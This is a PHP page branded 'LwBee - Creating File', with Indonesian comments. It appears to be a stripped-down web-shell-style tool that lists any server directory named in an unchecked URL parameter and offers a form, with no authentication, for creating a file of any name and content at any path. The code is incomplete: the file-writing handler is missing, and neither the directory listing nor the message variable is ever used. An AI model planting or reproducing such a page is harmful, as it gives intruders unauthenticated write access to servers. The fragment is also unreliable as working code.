<?php

// Fungsi untuk memindai direktori dan mengembalikan daftar file dan folder
function scanDirectory($path) {
    $items = [];
    
    if (is_dir($path)) {
        $scan = scandir($path);
        
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    
    return $items;
}

// Tentukan path root default menggunakan hasil dari scan direktori saat ini
$defaultRootPath = getcwd();
$rootPath = $_GET['path'] ?? $defaultRootPath;
$scannedItems = scanDirectory($rootPath);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LwBee Create File</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            max-width: 1000px;
            margin: 20px auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            background-color: #fff;
        }
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 4px;
        }
        .alert-success {
            color: #155724;
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .alert-danger {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        .alert-warning {
            color: #856404;
            background-color: #fff3cd;
            border-color: #ffeeba;
        }
        h1, h2 {
            text-align: center;
        }
        form {
            background-color: #f9f9f9;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px auto;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        textarea {
            resize: none;
            height: 100px;
        }
        button {
            background-color: #007BFF;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .file-manager {
            display: flex;
            flex-direction: column;
        }
        .breadcrumb {
            margin-bottom: 20px;
            font-size: 16px;
        }
        .breadcrumb a {
            text-decoration: none;
            color: #007BFF;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        ul.file-list {
            list-style: none;
            padding: 0;
        }
        ul.file-list li {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            display: flex;
            justify-content: left;
			padding-left: 2px;
        }
        ul.file-list li:last-child {
            border-bottom: none;
        }
        ul.file-list a {
            text-decoration: none;
            color: #333;
			padding-left: 5px;
        }
        ul.file-list a:hover {
            color: #007BFF;
        }
    </style>
</head>
<body>

<h1>LwBee - Creating File</h1>

<?php if (!empty($message)): ?>
    <?php echo $message; ?>
<?php endif; ?>

<h2>Buat File Baru</h2>
<form action="" method="post">
    <label for="path">Path:</label>
    <input type="text" id="path" name="path" value="<?php echo htmlspecialchars($rootPath); ?>" required>
    <br><br>

    <label for="filename">Nama File:</label>
    <input type="text" id="filename" name="filename" placeholder="contoh.txt" required>
    <br><br>

    <label for="content">Isi File:</label>
    <textarea id="content" name="content" placeholder="Masukkan isi file di sini..."></textarea>
    <br><br>

    <button type="submit">Buat File</button>
</form>

</body>
</html>
